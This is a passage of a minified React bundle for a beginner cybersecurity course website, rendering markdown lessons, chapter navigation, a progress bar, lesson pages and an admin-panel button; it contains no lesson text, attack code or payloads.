"));)L.push(w[_].slice(2)),_++;O.push(c.jsx("ul",{children:L.map((Z,D)=>c.jsx("li",{dangerouslySetInnerHTML:{__html:Z.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>").replace(/`(.*?)`/g,'<code style="background:rgba(239,68,68,0.1);padding:2px 6px;border-radius:4px">$1</code>')}},D))},`ul-${_}`));continue}if(/^\d+\. /.test(N)){const L=[];for(;_<w.length&&/^\d+\. /.test(w[_]);)L.push(w[_].replace(/^\d+\. /,"")),_++;O.push(c.jsx("ol",{children:L.map((Z,D)=>c.jsx("li",{dangerouslySetInnerHTML:{__html:Z.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>").replace(/`(.*?)`/g,'<code style="background:rgba(239,68,68,0.1);padding:2px 6px;border-radius:4px">$1</code>')}},D))},`ol-${_}`));continue}N.trim()&&O.push(c.jsx("p",{dangerouslySetInnerHTML:{__html:N.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>").replace(/`(.*?)`/g,'<code style="background:rgba(239,68,68,0.1);padding:2px 6px;border-radius:4px;font-family:JetBrains Mono,monospace;font-size:14px">$1</code>').replace(/\[(.*?)\]\((.*?)\)/g,'<a href="$2" target="_blank" style="color:var(--accent-cyan)">$1</a>')}},`p-${_}`)),_++}return O};return c.jsxs("div",{className:"app-container",children:[c.jsx("div",{className:"bg-grid"}),c.jsx("div",{className:"bg-noise"}),c.jsx("div",{className:"gradient-orb orb-red"}),c.jsx("div",{className:"gradient-orb orb-cyan"}),c.jsx("div",{className:"gradient-orb orb-purple"}),c.jsx("button",{className:"mobile-menu-btn",onClick:()=>X(!j),children:j?c.jsx(Ts,{size:24}):c.jsx(s0,{size:24})}),c.jsx("div",{className:`sidebar-overlay ${j?"open":""}`,onClick:()=>X(!1)}),c.jsxs("aside",{className:`sidebar ${j?"open":""}`,children:[c.jsxs("div",{className:"sidebar-header",onClick:ge,style:{cursor:"pointer"},children:[c.jsx("div",{className:"sidebar-logo",children:c.jsx(Ji,{size:24})}),c.jsx("span",{className:"sidebar-title",children:"Cybersecurity"})]}),c.jsxs("nav",{className:"sidebar-nav",children:[c.jsxs("div",{className:`nav-item ${K==="home"?"active":""}`,onClick:()=>{h("home"),X(!1)},children:[c.jsx(Py,{size:20,className:"nav-item-icon"}),c.jsx("span",{children:"Home"})]}),Ct.chapters.map(B=>c.jsxs("div",{className:"nav-section",children:[c.jsxs("div",{className:"nav-section-title",children:["Ch ",B.id,": ",B.title]}),B.lessons.map(w=>c.jsxs("div",{className:`nav-item ${U?.id===w.id?"active":""}`,onClick:()=>me(w),children:[ce.includes(w.id)?c.jsx(jl,{size:18,className:"nav-item-icon",style:{color:"var(--accent-green)"}}):c.jsx(bs,{size:18,className:"nav-item-icon"}),c.jsx("span",{children:w.title})]},w.id))]},B.id))]}),c.jsxs("div",{style:{marginTop:"auto",padding:"20px",borderTop:"1px solid var(--border-color)"},children:[c.jsxs("div",{style:{display:"flex",justifyContent:"space-between",marginBottom:"8px",fontSize:"14px",color:"var(--text-secondary)"},children:[c.jsx("span",{children:"Progress"}),c.jsxs("span",{children:[Fe,"%"]})]}),c.jsx("div",{className:"progress-bar",children:c.jsx("div",{className:"progress-fill",style:{width:`${Fe}%`}})})]})]}),c.jsxs("main",{className:"main-content",children:[K==="home"&&c.jsxs(c.Fragment,{children:[c.jsxs("div",{className:"hero",children:[c.jsxs("div",{className:"hero-badge",children:[c.jsx(Ji,{size:16}),c.jsx("span",{children:"Cybersecurity Course"})]}),c.jsxs("h1",{className:"hero-title",children:["Learn",c.jsx("br",{}),c.jsx("span",{children:"Cybersecurity"})]}),c.jsx("p",{className:"hero-subtitle",children:"Understand how hackers think, protect yourself online, and start your ethical hacking journey. No experience required!"}),c.jsxs("button",{className:"nav-button primary",onClick:()=>me(Ct.chapters[0].lessons[0]),style:{margin:"0 auto"},children:[c.jsx(r0,{size:20}),"Start Learning"]})]}),c.jsxs("div",{style:{marginBottom:"48px"},children:[c.jsx("h2",{style:{fontSize:"28px",fontWeight:"700",marginBottom:"24px"},children:"Course Chapters"}),Ct.chapters.map(B=>{const w=B.lessons.filter(_=>ce.includes(_.id)).length,O=Vd[B.id];return c.jsxs("div",{className:"chapter-card",onClick:()=>me(B.lessons[0]),style:{flexDirection:"column",padding:0,overflow:"hidden"},children:[O&&c.jsxs("div",{style:{width:"100%",height:"160px",overflow:"hidden",position:"relative"},children:[c.jsx("img",{src:`/cybersecurity-learning/${O.src.slice(1)}`,alt:O.alt,loading:"lazy",style:{width:"100%",height:"100%",objectFit:"cover",objectPosition:"center",transition:"transform 0.3s ease"}}),c.jsx("div",{style:{position:"absolute",bottom:0,left:0,right:0,height:"40px",background:"linear-gradient(transparent, var(--bg-card))"}})]}),c.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"16px",padding:"16px 20px",width:"100%"},children:[c.jsx("div",{className:"chapter-number",children:B.id}),c.jsxs("div",{className:"chapter-info",children:[c.jsx("div",{className:"chapter-title",children:B.title}),c.jsxs("div",{className:"chapter-meta",children:[B.description," • ",B.lessons.length," lessons",w>0&&c.jsxs("span",{style:{color:"var(--accent-green)",marginLeft:"8px"},children:["(",w,"/",B.lessons.length," complete)"]})]})]}),c.jsx(jn,{size:24,style:{color:"var(--text-muted)"}})]})]},B.id)})]}),c.jsxs("div",{className:"glass-card",style:{textAlign:"center"},children:[c.jsx("h3",{style:{marginBottom:"16px",fontSize:"20px"},children:"What You'll Learn"}),c.jsx("p",{style:{color:"var(--text-secondary)",marginBottom:"24px"},children:"By the end, you'll understand how real attacks work and how to defend against them:"}),c.jsx("div",{style:{display:"grid",gridTemplateColumns:"repeat(auto-fit, minmax(150px, 1fr))",gap:"16px"},children:["Password Security","Phishing Defense","Encryption","Network Scanning","Web Hacking","CTF Challenges"].map(B=>c.jsxs("div",{style:{padding:"16px",background:"rgba(239, 68, 68, 0.1)",borderRadius:"12px",border:"1px solid rgba(239, 68, 68, 0.2)"},children:[c.jsx(jl,{size:24,style:{color:"var(--accent-red)",marginBottom:"8px"}}),c.jsx("div",{style:{fontWeight:"500"},children:B})]},B))})]})]}),K==="lesson"&&U&&c.jsxs("div",{className:"lesson-container",children:[c.jsxs("div",{className:"lesson-header",children:[c.jsxs("div",{className:"lesson-breadcrumb",children:[c.jsx("a",{href:"#",onClick:B=>{B.preventDefault(),h("home")},children:"Home"}),c.jsx(jn,{size:16}),c.jsx("span",{children:U.title})]}),c.jsx("h1",{className:"lesson-title",children:U.title}),c.jsxs("div",{className:"lesson-meta",children:[c.jsxs("span",{style:{display:"flex",alignItems:"center",gap:"6px"},children:[c.jsx(xs,{size:16}),U.duration]}),ce.includes(U.id)&&c.jsxs("span",{style:{display:"flex",alignItems:"center",gap:"6px",color:"var(--accent-green)"},children:[c.jsx(jl,{size:16}),"Completed"]})]})]}),(()=>{const B=parseInt(U.id),w=Vd[B];return w?c.jsxs("div",{className:"infographic-container",children:[c.jsxs("div",{className:"infographic-badge",children:[c.jsx(t0,{size:14}),c.jsxs("span",{children:["Chapter ",B," Infographic"]})]}),c.jsx("img",{src:`/cybersecurity-learning/${w.src.slice(1)}`,alt:w.alt,className:"infographic-image",loading:"lazy",onClick:O=>O.target.classList.toggle("expanded")}),c.jsx("p",{className:"infographic-caption",children:"👆 Tap to expand"})]}):null})(),c.jsx("div",{className:"lesson-content",children:Ge(U.content)}),!ce.includes(U.id)&&c.jsxs("button",{className:"nav-button primary",style:{width:"100%",justifyContent:"center",marginTop:"32px"},onClick:()=>ke(U.id),children:[c.jsx(jl,{size:20}),"Mark as Complete"]}),c.jsxs("div",{className:"lesson-nav",children:[C()?c.jsxs("button",{className:"nav-button",onClick:()=>me(C()),children:[c.jsx(jn,{size:20,style:{transform:"rotate(180deg)"}}),"Previous"]}):c.jsx("div",{}),Pe()?c.jsxs("button",{className:"nav-button primary",onClick:()=>me(Pe()),children:["Next Lesson",c.jsx(jn,{size:20})]}):c.jsxs("button",{className:"nav-button primary",onClick:()=>h("home"),children:["Finish Course",c.jsx(jl,{size:20})]})]})]})]}),c.jsx("button",{className:"admin-trigger",onClick:()=>x(!0),title:"Admin Panel",children:c.jsx(h0,{size:24})}),c.jsx(N0,{courseData:Ct,isOpen:k,onClose:()=>{x(!1),window.location.hash=""}})]})}jy.createRoot(document.getElementById("root")).render(c.jsx(Ae.StrictMode,{children:c.jsx(j0,{})}));
